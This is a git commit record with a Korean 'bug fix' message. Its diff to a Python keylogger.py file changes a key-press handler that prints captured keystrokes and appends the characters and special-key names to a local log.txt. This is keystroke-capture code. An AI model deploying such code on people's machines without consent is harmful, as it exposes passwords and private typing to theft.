c74672f6c6701dd785c193c0d915e923ce998014
Logic-01001010 <dnwn306@naver.com>
2021-08-13 08:55:22 +0900

    버그 개선

--- keylogger.py
+++ keylogger.py
@@ -4,12 +4,19 @@ def on_press(key):
 
     f = open('./log.txt', 'a')
 
-    if type(key) is not type(Key.space):
-        print(key.char)
-        f.write(key.char)
-    else:
-        print(str(key))
+
+    if type(key) is type(Key.space):
+        print('[ht]', str(key), key)
         f.write('\n'+str(key)+'\n')
+        
+    else:
+        print('[ky]', key.char, key)
+
+        if key.char == None:
+            f.write('\n'+str(key)+'\n')
+        else:
+            f.write(key.char)
+
 
     f.close()
 
